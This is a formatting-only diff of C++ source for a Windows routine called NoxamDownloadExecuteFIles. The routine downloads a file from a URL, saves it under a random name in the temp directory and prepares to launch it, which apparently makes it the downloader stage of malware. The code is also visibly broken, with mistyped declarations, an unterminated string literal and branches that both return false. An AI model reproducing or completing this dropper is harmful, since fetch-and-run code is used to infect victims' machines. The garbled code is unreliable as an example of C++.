@@ -12,10 +12,7 @@
 
 using namespace std;
 
-
 void NoxamGenRandom(char *NxmS, const int NxmLen);
-
-
 
 /*
 |===========================================================
@@ -25,16 +22,16 @@ void NoxamGenRandom(char *NxmS, const int NxmLen);
 |
 |===========================================================
 */
-bool NoxamDownloadExecuteFIles(char* NxmFilePathX)
+bool NoxamDownloadExecuteFIles(char *NxmFilePathX)
 {
-    char* NxmHost, NxmPath, NxmData, NxmOutput;
+    char *NxmHost, NxmPath, NxmData, NxmOutput;
     int NxmLength, NxmSplitLength, NxmStringLength;
 
     if (!NoxamURLToHostPath(NxmFilePathX, &NxmHost, reinterpret_cast<char **>(&NxmPath)))
     {
         return false;
     }
-    NxmNameValuePair** NxmHeaders;
+    NxmNameValuePair **NxmHeaders;
     int NxmResult = NoxamHttQuery(NxmHost, NxmPath, NULL, &NxmHeaders, &NxmData, &NxmLength);
 
     if (NxmResult != 200 || NxmLength <= 0)
@@ -42,14 +39,14 @@ bool NoxamDownloadExecuteFIles(char* NxmFilePathX)
         NoxamFreeHTTPResponse(NxmHeaders, NxmData);
         return false;
     }
-    char* NxmTempDir = (char*)malloc(260);
+    char *NxmTempDir = (char *)malloc(260);
     GetTempPathA(260, NxmTempDir);
-    char* NxmRandomName = (char*)malloc(11);
+    char *NxmRandomName = (char *)malloc(11);
     NoxamGenRandom(NxmRandomName, 10);
-    char** NxmJoin = (char*)malloc(sizeof(char*) * 4);
+    char **NxmJoin = (char *)malloc(sizeof(char *) * 4);
     NxmJoin[0] = NxmTempDir;
     NxmJoin[1] = NxmRandomName;
-    char** NxmSplitResults = NoxamSplitString(NxmFilePathX, ".", &NxmFilePathX, true);
+    char **NxmSplitResults = NoxamSplitString(NxmFilePathX, ".", &NxmFilePathX, true);
 
     if (NxmSplitResults == 0)
     {
@@ -86,11 +83,11 @@ bool NoxamDownloadExecuteFIles(char* NxmFilePathX)
     ZeroMemory(&NxmSi, sizeof(NxmSi));
     ZeroMemory(&NxmPi, sizeof(NxmPi));
     NxmSi.cb = sizeof(STARTUPINFOA);
-    NxmJoin = (char**)malloc(sizeof(char**) * 3);
+    NxmJoin = (char **)malloc(sizeof(char **) * 3);
     NxmJoin[0] = "\";
-    NxmJoin[1] = NxmOutput;
+        NxmJoin[1] = NxmOutput;
     NxmJoin[2] = "\"";
-    char* NxmParams = NoxamJoinSplitString(NxmJoin, 3, &NxmStringLength);
+    char *NxmParams = NoxamJoinSplitString(NxmJoin, 3, &NxmStringLength);
     NoxamFreeJoinStringBuffer(NxmOutput);
     char NxmExplorePath[260];
     GetSystemDirectoryA(NxmExplorePath, 260);
@@ -101,14 +98,14 @@ bool NoxamDownloadExecuteFIles(char* NxmFilePathX)
         NoxamFreeJoinStringBuffer(NxmParams);
 
         return false;
-    } else {
+    }
+    else
+    {
         NoxamFreeJoinStringBuffer(NxmParams);
         DWORD NxmErr = GetLastError();
 
         return false;
     }
-
-
 }
 
 /*
@@ -123,10 +120,9 @@ void NoxamGenRandom(char *NxmS, const int NxmLen)
 {
     srand(time(NULL));
     static const char NxmAlphaNum[] = {
-            "0123456789"
-            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-            "abcdefghijklmnopqrstuvwxyz"
-    };
+        "0123456789"
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz"};
 
     for (int I = 0; I < NxmLen; ++I)
     {
